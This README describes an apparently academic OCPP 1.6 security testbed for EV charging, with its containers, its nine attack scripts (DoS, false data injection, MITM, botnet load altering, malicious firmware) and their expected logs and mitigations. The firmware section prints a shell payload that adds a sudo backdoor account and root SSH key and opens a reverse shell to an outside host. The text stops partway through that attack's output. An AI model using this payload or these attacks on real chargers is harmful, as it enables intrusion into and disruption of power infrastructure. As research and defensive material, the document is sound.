# EVSecSim — OCPP 1.6 Security Research Testbed

A proof-of-concept security research framework demonstrating known attack vectors against EV charging infrastructure over OCPP 1.6. Built for the SUTD thesis project on EV charging cybersecurity.

> **For authorized research and educational use only.**

---

## Overview

EVSecSim simulates a minimal EV charging ecosystem consisting of:

- A **CSMS** (Central System / Charge Point Management System) over WebSocket
- An **EVSE client** (EV Supply Equipment) backed by a live pandapower grid twin
- A **PGTwin grid simulator** (Dr. Biswas's 7-substation Singapore distribution network, 66 kV → 22 kV → 6.6 kV → 0.4 kV)
- Nine **attack scripts** demonstrating published OCPP 1.6 vulnerabilities across both internal and external threat models, including three attacks wired to the real PGTwin grid

The attacks target weaknesses documented by SaiFlow (2023) and Idaho National Laboratory (INL/CON-23-72329, 2023): no transport encryption, no message authentication, no connection deduplication, no charge-point identity verification, and no firmware signature verification.

---

## Project Structure

```
SUTDEVsec/
├── Dockerfile                      # Shared image for all services
├── docker-compose.yml              # Full containerised topology
├── capture_attacks.ps1             # Automated pcap capture for all profiles
├── .dockerignore
├── requirements.txt
├── core/
│   ├── csms_server4.py             # OCPP 1.6 CSMS (WebSocket server on port 9000)
│   └── evse_client4_fixed.py       # Legitimate EVSE client + pandapower grid simulation
├── grid/
│   └── ZSGplussync_docker.py       # PGTwin: 7-substation Singapore grid (Dr. Biswas)
└── attacks/
    ├── run_attacks.py                  # Interactive orchestrator (local use)
    ├── attack_saiflow_dos_patched.py   # Attack 1:  SaiFlow duplicate-CP DoS
    ├── attack_fdi.py                   # Attack 2:  MeterValues False Data Injection
    ├── attack_mitm_session_patched.py  # Attack 3a: MITM proxy — internal (operator-net)
    ├── attack_mitm_ext.py              # Attack 3b: MITM proxy — external (public-net)
    ├── attack_load_altering.py         # Attack 4:  Coordinated botnet load altering
    ├── attack_firmware.py              # Attack 5:  Malicious firmware update / RCE
    ├── attack_duration_spoof.py        # Attack 6:  Duration spoofing (StopTransaction drop)
    ├── attack_overload_grid.py         # Attack 7:  Single EVSE grid overload + PGTwin intro
    ├── attack_load_grid.py             # Attack 8:  Coordinated load altering + PGTwin grid
    ├── attack_spoof_grid.py            # Attack 9:  Duration spoofing + PGTwin grid
    └── a6breakers.py                   # Grid topology visualiser (Plotly HTML)
```

---

## Core Components

### CSMS — `core/csms_server4.py`

A minimal OCPP 1.6 Central System Management Server that intentionally omits all security controls present in production deployments. It exists to be a realistic target: it behaves like a real CSMS but leaves every documented OCPP 1.6 vulnerability exposed.

**What it does:**
- Listens for WebSocket connections on `ws://0.0.0.0:9000`
- Reads the first raw text frame as the Charge Point identity (no credential check)
- Spawns an independent asyncio task per connection — there is **no CP registry**, so duplicate CP IDs create two live sessions simultaneously (the SaiFlow vulnerability)
- Accepts every `BootNotification` unconditionally (`RegistrationStatus.accepted`)
- Issues auto-incrementing `transactionId` values starting at 1 (shared global counter across all CPs)
- Logs `MeterValues` power readings to stdout — no plausibility check, no signature verification
- Logs `StopTransaction` with billing summary — no integrity check on the reported `meterStop`
- Handles `FirmwareStatusNotification` — logs progress, no verification of the firmware source

**Default settings:**

| Parameter | Value | Set via |
|-----------|-------|---------|
| Bind address | `0.0.0.0` | `BIND_HOST` env var |
| Port | `9000` | hardcoded |
| Heartbeat interval returned to EVSE | `10 s` | hardcoded |
| Registration policy | accept all | hardcoded |
| Duplicate CP handling | both sessions kept alive | no dedup logic |
| Message authentication | none | OCPP 1.6 has none |

**OCPP messages handled:** `BootNotification`, `Heartbeat`, `StartTransaction`, `MeterValues`, `StopTransaction`, `FirmwareStatusNotification`

---

### EVSE — `core/evse_client4_fixed.py`

A legitimate EV charging station simulator backed by a live pandapower grid twin. It models realistic load behaviour across 5 EV connectors and is the "victim" that attack scripts target or impersonate.

**What it does:**

*Default mode (pandapower simulation):*
- Connects to the CSMS as CP `CP_1`
- Sends `BootNotification` (vendor: `Vendor`, model: `Model1`)
- Builds a local pandapower grid twin: 6.6 kV → 0.4 kV, 1 MVA transformer, 5 load buses at 60 kW rated each
- Every second, each load is randomly toggled on or off (50 % probability)
- Every 5 seconds, runs a DC power flow (`pp.runpp`) and reports each active load's real power as a `MeterValues` frame (measurand: `Power.Active.Import`, unit: `kW`)
- Suppresses readings below 0.5 kW to reduce noise
- Simulation runs for **300 seconds** then the process exits

*Timed session mode (`--session-duration N`):*
- Skips pandapower — sends a single `StartTransaction` (id\_tag: `EV-CARD-001`, `meterStart=0`)
- Sends `MeterValues` every **5 seconds** at a fixed **60 kW** with a cumulative energy register (Wh)
- After N seconds, sends `StopTransaction` with the final energy reading and exits cleanly
- Used by the duration-spoof attack so the proxy has a real `StopTransaction` to intercept

**Default settings:**

| Parameter | Value | Set via |
|-----------|-------|---------|
| CP identity | `CP_1` | hardcoded |
| CSMS URL | `ws://127.0.0.1:9000` | `--url` |
| Simulation duration | `300 s` | hardcoded |
| Power flow interval | every `5 s` | hardcoded |
| Load per connector (rated) | `60 kW` | pandapower model |
| Connectors | `5` | pandapower model |
| MeterValues measurand | `Power.Active.Import` | hardcoded |
| Timed session power | `60 kW` (fixed) | hardcoded |
| Timed session MeterValues interval | `5 s` | hardcoded |
| Timed session id\_tag | `EV-CARD-001` | hardcoded |
| Session duration (timed mode) | no default — required | `--session-duration` |

**OCPP messages sent:** `BootNotification`, `MeterValues`, `StartTransaction` (timed mode), `StopTransaction` (timed mode), `FirmwareStatusNotification` (when firmware update received)

---

## Containerised Network Topology

Each component runs in its own container on a logically separate network segment. The CSMS is dual-homed. External attackers on `public-net` can only reach `172.20.0.10:9000` and have zero visibility into `operator-net`.

```
  ┌──────────────────────────────────────────────────────────────────────────────┐
  │                        public-net  ·  172.20.0.0/24                           │
  │                                                                                │
  │  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐  │
  │  │  atk-saiflow  │   │   atk-load   │   │ atk-mitm-ext │   │evse-via-mitm │  │
  │  │ 172.20.0.30   │   │ 172.20.0.40  │   │ 172.20.0.30  │   │  -ext        │  │
  │  │ (Attack 1)    │   │ (Attack 4)   │   │ (Attack 3b)  │   │ 172.20.0.50  │  │
  │  └──────┬────────┘   └──────┬───────┘   └──────┬───────┘   └──────┬───────┘  │
  │         │                   │                   │  proxy :9002     │           │
  │         └─────────┬─────────┘       ws://csms:9000  ◄─────────────┘           │
  │                   │ ws://csms:9000               │                             │
  │                   ▼                              ▼                             │
  │          ┌─────────────────────────────────────────┐                          │
  │          │              csms  172.20.0.10            │ ◄── :9000 → host       │
  │          └─────────────────────┬───────────────────┘                          │
  └────────────────────────────────│──────────────────────────────────────────────┘
                                   │ dual-homed
  ┌────────────────────────────────│──────────────────────────────────────────────┐
  │               operator-net  ·  172.19.0.0/24  [internal · isolated]            │
  │                                   │                                             │
  │                       ┌───────────┴──────────┐                                 │
  │                       │    csms  172.19.0.10  │                                 │
  │                       └──┬────┬────┬──────────┘                                │
  │                          │    │    │    │                                       │
  │         ┌────────────────┘    │    │    └──────────────┐                       │
  │         ▼                     ▼    ▼                   ▼                       │
  │  ┌─────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐   │
  │  │    evse      │  │ evse-via-fdi │  │   atk-mitm   │  │   atk-firmware   │   │
  │  │ 172.19.0.20  │  │ 172.19.0.30  │  │ 172.19.0.40  │  │  172.19.0.30    │   │
  │  │ (legit EVSE) │  │(compromised) │  │ proxy :9001  │  │ rogue CSMS :9000 │   │
  │  └─────────────┘  └──────────────┘  └──────┬───────┘  │ payload HTTP:8080│   │
  │                                              │          └────────┬─────────┘   │
  │                                ws://atk-mitm:9001               │             │
  │                                              ▼                   ▼             │
  │                                 ┌──────────────────┐  ┌──────────────────┐    │
  │                                 │  evse-via-mitm   │  │ evse-via-firmware│    │
  │                                 │  172.19.0.50     │  │  172.19.0.60     │    │
  │                                 └──────────────────┘  └──────────────────┘    │
  │                                                                                │
  │  ┌──────────────────────────┐                                                  │
  │  │  atk-duration-spoof      │  proxy :9003  ←── evse-via-duration-spoof       │
  │  │  172.19.0.41  (Attack 6) │  drops StopTransaction, injects phantom load    │
  │  │  evse-via-duration-spoof │                                                  │
  │  │  172.19.0.61             │                                                  │
  │  └──────────────────────────┘                                                  │
  └────────────────────────────────────────────────────────────────────────────────┘
```

### Threat model per attack

| # | Attack | Attacker position | Network | Operator-net visible? | Initial access vector |
|---|--------|-------------------|---------|----------------------|----------------------|
| 1 | SaiFlow DoS | External | public-net | No | Direct WebSocket to exposed CSMS port |
| 2 | False Data Injection | Compromised EVSE (insider) | operator-net | Yes | Supply chain / physical compromise |
| 3a | MITM — Internal | Compromised network device | operator-net | Yes | ARP poisoning / rogue switch |
| 3b | MITM — External | External attacker | public-net | No | BGP hijack / DNS poisoning / rogue cloud proxy |
| 4 | Load Altering | External botnet | public-net | No | Direct WebSocket to exposed CSMS port |
| 5 | Malicious Firmware Update | Rogue / compromised CSMS | operator-net | Yes | DNS poisoning / compromised CSMS platform |
| 6 | Duration Spoofing | MITM on operator LAN | operator-net | Yes | ARP poisoning / rogue switch |
| 7 | Single EVSE Grid Overload + PGTwin | Single rogue EVSE | public-net | No | Direct WebSocket to exposed CSMS port |
| 8 | Load Altering + PGTwin | External botnet | public-net | No | Direct WebSocket to exposed CSMS port |
| 9 | Duration Spoofing + PGTwin | MITM on operator LAN | operator-net | Yes | ARP poisoning / rogue switch |

---

## Docker Deployment

### Prerequisites

- Docker Desktop (or Docker Engine + Compose plugin)

### Run scenarios

```bash
# Baseline — CSMS + legitimate EVSE (no attack)
docker compose --profile normal up --build

# Attack 1 — SaiFlow DoS  (external attacker + victim EVSE)
docker compose --profile saiflow up --build

# Attack 2 — False Data Injection  (compromised EVSE)
docker compose --profile fdi up --build

# Attack 3a — MITM proxy, INTERNAL  (operator-net, ARP poisoning threat model)
docker compose --profile mitm up --build

# Attack 3b — MITM proxy, EXTERNAL  (public-net, BGP/DNS hijack threat model)
docker compose --profile mitm-ext up --build

# Attack 4 — Coordinated load altering  (external botnet, 10 bots)
docker compose --profile load up --build

# Attack 5 — Malicious firmware update  (rogue CSMS, no real CSMS started)
docker compose --profile firmware up --build

# Attack 6 — Duration spoofing  (StopTransaction drop, phantom load)
docker compose --profile duration-spoof up --build

# Attack 7 — Single EVSE grid overload + PGTwin intro  (step-wise Bus 44 voltage sag)
docker compose --profile overload-grid up --build --force-recreate

# Attack 8 — Coordinated load altering + PGTwin real grid  (external botnet → Bus 44 voltage sag)
docker compose --profile load-grid up --build --force-recreate

# Attack 9 — Duration spoofing + PGTwin real grid  (ghost session holds Bus 44 depressed 60 s)
docker compose --profile spoof-grid up --build --force-recreate
```

Drop `--build` on repeat runs if no code has changed.

> **Note for Attacks 7, 8 and 9:** Always use `--force-recreate` (or run `docker compose --profile <X> down` first). Docker Compose reuses running containers across sessions; without recreating, the `pgtwin` container may start without its shared volume mount and the OCPP→grid coupling will not work. For Attack 9, do **not** use `--abort-on-container-exit` — the EVSE container exits by design after receiving the forged `StopTransaction` ACK, and the ghost phase must continue for a further 60 seconds after that.

### Follow logs

```bash
# All containers in a scenario
docker compose --profile fdi logs -f

# Individual containers
docker logs -f csms
docker logs -f evse-via-fdi
docker logs -f atk-mitm
docker logs -f atk-mitm-ext
docker logs -f atk-firmware
docker logs -f evse-via-firmware
docker logs -f atk-duration-spoof
docker logs -f evse-via-duration-spoof

# Attack 7 containers
docker logs -f atk-overload-grid
docker logs -f pgtwin

# Attack 8 containers
docker logs -f atk-load-grid
docker logs -f pgtwin

# Attack 9 containers
docker logs -f atk-spoof-grid
docker logs -f evse-via-spoof-grid
docker logs -f pgtwin
```

### Tear down

```bash
docker compose --profile <profile> down --remove-orphans
```

### Automated pcap capture

`capture_attacks.ps1` automates the full capture workflow for each profile: builds containers, waits for initialisation, runs `tcpdump` inside the capture container for the configured window, extracts the pcap, and tears down.

```powershell
# Capture all profiles in sequence (~9 min total)
.\capture_attacks.ps1

# Capture one profile
.\capture_attacks.ps1 -Profile saiflow
.\capture_attacks.ps1 -Profile duration-spoof
```

Output files are written to `captures\attack_<label>.pcap`. Open in Wireshark and right-click any TCP stream on port 9000 → **Decode As → WebSocket** to view OCPP JSON payloads.

### Wireshark filters by attack

| Attack | Capture container | Filter |
|--------|------------------|--------|
| Normal baseline | `csms` | `websocket` |
| FDI | `csms` | `websocket && ip.dst == 172.19.0.10` |
| MITM internal | `csms` | `websocket && (tcp.port == 9000 or tcp.port == 9001)` |
| MITM external | `csms` | `websocket && (tcp.port == 9000 or tcp.port == 9002)` |
| SaiFlow / Load | `csms` | `websocket && ip.dst == 172.20.0.10` |
| Firmware | `atk-firmware` | `websocket \|\| http` |
| Duration spoofing | `atk-duration-spoof` | `websocket && (tcp.port == 9000 or tcp.port == 9003)` |
| EVSE grid overload + PGTwin | `atk-overload-grid` | `websocket && ip.dst == 172.20.0.10` |
| Load altering + PGTwin | `atk-load-grid` | `websocket && ip.dst == 172.20.0.10` |
| Duration spoofing + PGTwin | `atk-spoof-grid` | `websocket && (tcp.port == 9000 or tcp.port == 9004)` |

For Attack 5 also inspect the HTTP payload delivery (port 8080 is published to host):

```bash
curl http://localhost:8080/firmware.sh
```

For Attack 6 the key evidence spans two ports: StopTransaction on port 9003 (EVSE→proxy, **absent on port 9000**), then phantom MeterValues on port 9000 only after port 9003 goes silent.

---

## Local Quick Start (no Docker)

### Requirements

```
ocpp==2.1.0
websockets==16.0
pandapower==3.4.0
numpy==2.2.0
matplotlib==3.10.0
plotly==6.7.0
```

```bash
pip install -r requirements.txt
```

### Run components manually

```bash
# Terminal 1 — CSMS
python core/csms_server4.py

# Terminal 2 — Legitimate EVSE (300s pandapower simulation)
python core/evse_client4_fixed.py

# Terminal 2 — Timed charging session (for duration-spoof testing)
python core/evse_client4_fixed.py --session-duration 20

# Terminal 2 — EVSE via internal MITM proxy (port 9001)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9001

# Terminal 2 — EVSE via external MITM proxy (port 9002)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9002

# Terminal 2 — EVSE via duration-spoof proxy (port 9003)
python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20

# Attack 5 — rogue CSMS replaces the real one; EVSE connects to it
# Terminal 1 (rogue CSMS + HTTP payload server):
python attacks/attack_firmware.py
# Terminal 2 (EVSE — points at rogue CSMS, NOT the real one):
python core/evse_client4_fixed.py --url ws://127.0.0.1:9000

# Attack 6 — duration spoof proxy (run alongside real CSMS)
# Terminal 1: python core/csms_server4.py
# Terminal 2: python attacks/attack_duration_spoof.py
# Terminal 3: python core/evse_client4_fixed.py --url ws://127.0.0.1:9003 --session-duration 20
```

---

## Attacks

### Attack 1 — SaiFlow Denial-of-Service

**Script:** `attacks/attack_saiflow_dos_patched.py`  
**Profile:** `saiflow`  
**Network:** public-net (external attacker)

Exploits OCPP 1.6's lack of duplicate-connection detection. A rogue client connects with the same CP ID (`CP_1`) as a legitimate EVSE. The CSMS accepts the second connection without deduplication, creating session shadowing: operator commands are routed to the attacker's socket, not the real charger. A Heartbeat flood (~1000 HB/s) then saturates the CSMS event loop.

```bash
python attacks/attack_saiflow_dos_patched.py
python attacks/attack_saiflow_dos_patched.py --cp-id CP_2 --duration 30
python attacks/attack_saiflow_dos_patched.py --interval 0.1
```

**Expected output — attack terminal:**
```
============================================================
  EVSecSim — SaiFlow DoS Attack
============================================================
  Target CSMS   : ws://127.0.0.1:9000
  Spoofed CP ID : CP_1
  Flood interval: 1.0 ms  (1000 HB/s)
  Duration      : unlimited
============================================================

[ATK 14:02:31.415] Phase 1 — Opening rogue WebSocket to ws://127.0.0.1:9000
[ATK 14:02:31.423] Phase 1 — Sending raw CP ID: 'CP_1'
[OK  14:02:31.431] Phase 1 — CSMS accepted connection for 'CP_1'
[ATK 14:02:31.447] Sending rogue BootNotification as 'CP_1'
[ATK 14:02:31.447]   Vendor : RogueVendor
[ATK 14:02:31.447]   Model  : RogueCP-v1.0
[OK  14:02:31.462] CSMS accepted rogue BootNotification — shadow session active
[ATK 14:02:31.463] Starting Heartbeat flood (interval=1.0 ms)
[ATK 14:02:31.463] Legitimate EVSE MeterValues should now stop appearing in CSMS output

[ATK 14:02:36.471] Flood stats — sent: 4,921  errors: 0  rate: 984 HB/s  elapsed: 5.0s
[ATK 14:02:41.479] Flood stats — sent: 9,887  errors: 0  rate: 989 HB/s  elapsed: 10.1s
```

**Expected output — CSMS terminal (key evidence: duplicate CP_1 connections accepted):**
```
[CSMS] Connected: CP_1
[CSMS] BootNotification from: CP_1 (LegitVendor / EVSE-v2.0)
[CSMS] CP_1 | Power = 60.0 kW
[CSMS] Connected: CP_1                       ← second connection accepted, no dedup
[CSMS] BootNotification from: CP_1 (RogueVendor / RogueCP-v1.0)
[CSMS] CP_1 | Power = 60.0 kW               ← legitimate EVSE still printing (session shadowing)
```

**Root cause:** No CP authentication; no connection registry in OCPP 1.6.  
**Mitigation:** OCPP 2.0.1 with mutual TLS; CSMS-side duplicate-session rejection.

---

### Attack 2 — False Data Injection (FDI)

**Script:** `attacks/attack_fdi.py`  
**Profile:** `fdi`  
**Network:** operator-net (insider / compromised EVSE)

A compromised EVSE fabricates MeterValues readings. The CSMS trusts all reported values unconditionally — no signing or plausibility check exists.

| Phase | Real draw | Reported to CSMS | Effect |
|-------|-----------|------------------|--------|
| 1 — Normal | 60 kW | 60 kW | Baseline |
| 2 — Under-report | 60 kW | 0 kW | Grid load hidden; billing zeroed |
| 3 — Over-report | 0 kW | 999 kW | Phantom demand event triggered |

```bash
python attacks/attack_fdi.py
CSMS_URL=ws://127.0.0.1:9000 python attacks/attack_fdi.py
```

**Expected output — attack terminal:**
```
Connecting to CSMS at ws://127.0.0.1:9000 as 'CP_1' ...
[14:05:10] Registered with CSMS — status: accepted

PHASE 1 — NORMAL REPORTING (15s)
[14:05:10] NORMAL  | real=  60.0 kW | reported=  60.0 kW | ✓
[14:05:12] NORMAL  | real=   0.0 kW | reported=   0.0 kW | ✓
[14:05:14] NORMAL  | real=  60.0 kW | reported=  60.0 kW | ✓

PHASE 2 — UNDER-REPORTING (15s)
Charger draws 60.0 kW. Reporting 0.0 kW to CSMS.
[14:05:25] UNDER   | real=  60.0 kW | reported=   0.0 kW | HIDING 60 kW from operator
[14:05:27] UNDER   | real=  60.0 kW | reported=   0.0 kW | HIDING 60 kW from operator

PHASE 3 — OVER-REPORTING (15s)
Charger is idle. Reporting 999.0 kW to CSMS.
[14:05:40] OVER    | real=   0.0 kW | reported= 999.0 kW | FAKING 999 kW phantom load
[14:05:42] OVER    | real=   0.0 kW | reported= 999.0 kW | FAKING 999 kW phantom load
```

**Expected output — CSMS terminal (key evidence: gap between attack and CSMS values):**
```
[CSMS] Connected: CP_1
[CSMS] BootNotification from: CP_1 (Compromised-Vendor / FDI-Demo-v1)
[CSMS] CP_1 | Power = 60.0 kW     ← Phase 1: matches attack terminal (accurate)
[CSMS] CP_1 | Power = 0.0 kW
[CSMS] CP_1 | Power = 0.0 kW      ← Phase 2: CSMS sees 0 while charger draws 60 kW
[CSMS] CP_1 | Power = 0.0 kW
[CSMS] CP_1 | Power = 999.0 kW    ← Phase 3: CSMS sees 999 kW on idle charger
[CSMS] CP_1 | Power = 999.0 kW
```

**Root cause:** MeterValues are unsigned and unverified in OCPP 1.6.  
**Mitigation:** OCPP 2.0.1 signed MeterValues; CSMS plausibility checks; cross-reference with SCADA.

---

### Attack 3a — MITM WebSocket Proxy (Internal)

**Script:** `attacks/attack_mitm_session_patched.py`  
**Profile:** `mitm`  
**Network:** operator-net (172.19.0.40)  
**Initial access:** ARP poisoning / rogue switch on charging site LAN

An attacker already on the operator LAN intercepts the plaintext OCPP channel between the EVSE and CSMS.

| Phase | Duration | Action |
|-------|----------|--------|
| 1 — Transparent relay | 0–10 s | All traffic forwarded and logged, nothing modified |
| 2 — MeterValues tampering | 10–20 s | Real kW values replaced with 999 kW before reaching CSMS |
| 3 — StopTransaction injection | 20 s+ | Forged `StopTransaction` sent to CSMS; session closed while EVSE keeps charging; billing corrupted |

```bash
python attacks/attack_mitm_session_patched.py --csms-url ws://127.0.0.1:9000
python attacks/attack_mitm_session_patched.py --tamper-delay 5 --inject-delay 15
python core/evse_client4_fixed.py --url ws://127.0.0.1:9001
```

**Expected output — proxy terminal:**
```
  Proxy listening on  : ws://0.0.0.0:9001
  Forwarding to CSMS  : ws://127.0.0.1:9000
  Tamper phase starts : T+10s after EVSE connects
  Injection at        : T+20s after EVSE connects
  Tampered power value: 999.0 kW

[PRX 14:10:01.200] EVSE connected to proxy — opening upstream connection to CSMS
[PRX 14:10:01.215] CP identity captured: 'CP_1' — relaying to CSMS
[ATK 14:10:01.216] MITM SESSION ACTIVE for CP: 'CP_1'
[E→C 14:10:01.220] [BootNotification] uid=a1b2c3d4 → forwarding
[E→C 14:10:03.401] [MeterValues] uid=e5f6g7h8 → forwarding       ← Phase 1: transparent

[TAM 14:10:11.220] PHASE 2 ACTIVE — MeterValues TAMPERING
[TAM 14:10:11.224] TAMPERED #1: real=34.52 kW → csms sees=999.0 kW
[TAM 14:10:13.401] TAMPERED #2: real=41.18 kW → csms sees=999.0 kW

[ATK 14:10:21.220] PHASE 3 — INJECTING FORGED StopTransaction
[ATK 14:10:21.220]   uid       : mitm-stop-1718812221
[ATK 14:10:21.220]   meterStop : 0 Wh  (billing corrupted)
[ATK 14:10:21.220]   reason    : Remote
[ATK 14:10:21.220] EVSE keeps charging. CSMS closes session.
[ATK 14:10:21.235] StopTransaction frame delivered to CSMS
```

**Expected output — CSMS terminal (key evidence: session closed while EVSE never stopped):**
```
[CSMS] Connected: CP_1
[CSMS] BootNotification from: CP_1 (EV-Vendor / EVSE-2.0)
[CSMS] CP_1 | Power = 34.52 kW    ← Phase 1: real values pass through
[CSMS] CP_1 | Power = 999.0 kW    ← Phase 2: tampered — real value was ~41 kW
[CSMS] CP_1 | Power = 999.0 kW

[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[CSMS]  STOPTRANSACTION received from : CP_1
[CSMS]  transaction_id : 1
[CSMS]  meter_stop     : 0 Wh
[CSMS]  --> SESSION TERMINATED — billing closed at 0 Wh   ← injected, EVSE still charging
[CSMS] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
```

**Root cause:** Plaintext WebSocket (ws://); no message integrity.  
**Mitigation:** TLS (wss://); mutual TLS certificate authentication; OCPP 2.0.1 per-message signing.

---

### Attack 3b — MITM WebSocket Proxy (External)

**Script:** `attacks/attack_mitm_ext.py`  
**Profile:** `mitm-ext`  
**Network:** public-net (172.20.0.30) — **zero operator-net access**  
**Initial access:** BGP hijacking / DNS poisoning / rogue cloud reverse proxy

An attacker on the WAN path intercepts EVSE traffic destined for a cloud-hosted CSMS. No physical presence at the charging site is required. The attack exploits the fact that OCPP 1.6 uses plaintext `ws://` on the public internet, providing no protection against WAN-level interception.

Same three-phase attack capability as 3a (transparent relay → MeterValues tampering → StopTransaction injection), but achieved entirely from the public network:

```bash
python attacks/attack_mitm_ext.py --csms-url ws://127.0.0.1:9000
python attacks/attack_mitm_ext.py --tamper-delay 5 --inject-delay 15
python core/evse_client4_fixed.py --url ws://127.0.0.1:9002
```

**Expected output** is identical in structure to Attack 3a above, with the proxy listening on port 9002 instead of 9001. The key distinction visible in logs and pcap is the source IP: the proxy originates from `172.20.0.30` (public-net), not from the operator LAN.

**Key distinction from 3a:** The attacker is on `public-net` only. This models real-world scenarios where EVSEs connect to cloud CSMS platforms over 4G/LTE, and the attacker intercepts the WAN path rather than the local LAN.

**Root cause:** No TLS on the WAN path; no certificate pinning; EVSE cannot distinguish real CSMS from a proxy.  
**Mitigation:** WSS + certificate pinning; mutual TLS; DNS-over-TLS / DNSSEC; OCPP 2.0.1 signed messages.

---

### Attack 4 — Coordinated Load Altering

**Script:** `attacks/attack_load_altering.py`  
**Profile:** `load`  
**Network:** public-net (external botnet)

A botnet of compromised EVSEs connects to the CSMS and executes coordinated load commands. A pandapower grid twin (220 kV → 66 kV → 22 kV; 500 EV chargers; 1,510 MW total load) runs a power flow after each phase and reports real grid impact metrics.

| Phase | Action | Grid effect |
|-------|--------|-------------|
| Baseline | All bots at 220 kW | Normal operation |
| Surge | All bots simultaneously max load | Voltage sag; transformer overload |
| Drop | All bots simultaneously drop to zero | Voltage rise; unnecessary generation dispatch |
| Oscillate | Bots toggle 0 ↔ 220 kW every 5 s | Protection relay misoperation risk |

```bash
python attacks/attack_load_altering.py --bots 10
python attacks/attack_load_altering.py --bots 50    # 10% of 500-station fleet
python attacks/attack_load_altering.py --bots 500   # full fleet takeover
```

**Expected output — attack terminal (10-bot run):**
```
  CSMS            : ws://127.0.0.1:9000
  Bot fleet size  : 10 chargers
  Fleet coverage  : 2% of 500-station grid twin
  Simulated load  : 2.2 MW botnet / 110 MW total EV

[GRD 14:15:03] Building pandapower grid twin (a6breakers topology)...
[GRD 14:15:05] Grid twin ready: 500 EV chargers, 1510 MW total load

[BOT 14:15:05] Connecting 10 bots to CSMS...
  Connected: 10/10
[OK  14:15:06] 10 bots connected and registered with CSMS

  [14:15:06] Tick  1 — all bots → 220.0 kW (normal)

[GRD 14:15:26] Power flow result — Baseline (all normal)
[GRD 14:15:26]   EV load        :   110.0 MW  (nominal: 110 MW)
[GRD 14:15:26]   22kV vm_pu     :  0.9456 pu  (RISE ▲ from nominal 0.9456)
[GRD 14:15:26]   Trafo loading  :  22.0%
[GRD 14:15:26]   Est. Δf        : +0.0000 Hz

  [14:15:26] Tick  1 — SURGE all 10 bots → 220.0 kW  [coordinated max load]

[GRD 14:15:46] Power flow result — Coordinated surge (all max)
[GRD 14:15:46]   22kV vm_pu     :  0.9408 pu  (SAG ▼ from nominal 0.9456)
[GRD 14:15:46]   Trafo loading  :  22.0%

  [14:15:46] Tick  1 — DROP  all 10 bots →   0.0 kW  [coordinated zero load]

[GRD 14:16:06] Power flow result — Coordinated drop (all zero)
[GRD 14:16:06]   22kV vm_pu     :  0.9462 pu  (RISE ▲ from nominal 0.9456)
[GRD 14:16:06]   Est. Δf        : -0.0001 Hz

  [14:16:06] Tick  1 — MAX ▲  all 10 bots → 220.0 kW
  [14:16:11] Tick  2 — ZERO ▼ all 10 bots →   0.0 kW

  Mode                                  EV MW    22kV pu    Trafo %
  --------------------------------- -------- ---------- ----------
  Baseline (all normal)               110.0     0.9456      22.0%    OK
  Coordinated surge (all max)         110.0     0.9408      22.0%  ▼ SAG
  Coordinated drop (all zero)         107.8     0.9462      21.6%  ▲ RISE
  Oscillating (mid-cycle)             110.0     0.9456      22.0%    OK
```

**Expected output — CSMS terminal (10 bots registering, then load flood):**
```
[CSMS] Connected: BOT_001
[CSMS] BootNotification from: BOT_001 (BotFleet-Vendor / BotCP-220kW)
[CSMS] Connected: BOT_002
...
[CSMS] Connected: BOT_010
[CSMS] BOT_001 | Power = 220.0 kW
[CSMS] BOT_002 | Power = 220.0 kW
[CSMS] BOT_003 | Power = 220.0 kW       ← coordinated surge: all bots simultaneously
...
[CSMS] BOT_001 | Power = 0.0 kW
[CSMS] BOT_002 | Power = 0.0 kW         ← coordinated drop: all bots simultaneously
```

**Root cause:** No per-CP rate limiting; no operator-signed charging profiles.  
**Mitigation:** OCPP 2.0.1 `SetChargingProfile` with signed profiles; CSMS anomaly detection; grid-side ROCOL protection relays.

---

### Attack 5 — Malicious Firmware Update / Remote Code Execution

**Script:** `attacks/attack_firmware.py`  
**Profile:** `firmware`  
**Network:** operator-net (172.19.0.30)  
**Based on:** INL/CON-23-72329 PoC #3

OCPP 1.6 `UpdateFirmware` carries a plain HTTP/FTP URL and a scheduled retrieval time. There is no firmware signature field, no certificate, and no integrity hash. The EVSE trusts the URL unconditionally and installs whatever is served.

This script acts as a **rogue CSMS** and simultaneously runs an embedded HTTP server serving a malicious shell script payload. No real CSMS is started in the `firmware` profile — `atk-firmware` replaces it entirely.

| Phase | Description |
|-------|-------------|
| 1 — Normal operation (0–10 s) | EVSE connects, boots, sends MeterValues normally. No OCPP mechanism exists to verify CSMS identity. |
| 2 — Firmware push (t = 10 s) | Rogue CSMS sends `UpdateFirmware` pointing at `http://atk-firmware:8080/firmware.sh`. |
| 3 — Payload execution | EVSE downloads the script, prints its full contents, walks through `Downloading → Downloaded → Installing → Installed` with no integrity check at any step. |

**Payload delivered to EVSE (`firmware.sh`):**
```sh
useradd -m -s /bin/bash backdoor
echo 'backdoor:EV$ecr3t!' | chpasswd
usermod -aG sudo backdoor
echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &
```

```bash
python attacks/attack_firmware.py
python attacks/attack_firmware.py --push-delay 5
python attacks/attack_firmware.py --firmware-host atk-firmware --push-delay 10
```

**Expected output — rogue CSMS terminal:**
```
  Rogue CSMS    : ws://0.0.0.0:9000
  Payload URL   : http://127.0.0.1:8080/firmware.sh
  Push delay    : 10s after EVSE boot

[14:20:01] [HTTP-PAYLOAD] Serving malicious firmware at http://0.0.0.0:8080/firmware.sh
[14:20:01] [ROGUE-CSMS] Listening on ws://0.0.0.0:9000

[14:20:05] [ROGUE-CSMS] EVSE connected: CP_1
[14:20:05] [ROGUE-CSMS] BootNotification from CP_1 (EV-Vendor / EVSE-2.0)
[14:20:05] [ROGUE-CSMS] Accepted — EVSE cannot distinguish this from the real CSMS
[14:20:05] [ROGUE-CSMS] Waiting 10s before pushing malicious firmware ...
[14:20:07] [ROGUE-CSMS] MeterValues from CP_1: 34.5 kW

[14:20:15] [ROGUE-CSMS] === PHASE 2 — FIRMWARE PUSH ===
[14:20:15] [ROGUE-CSMS] Sending UpdateFirmware to EVSE
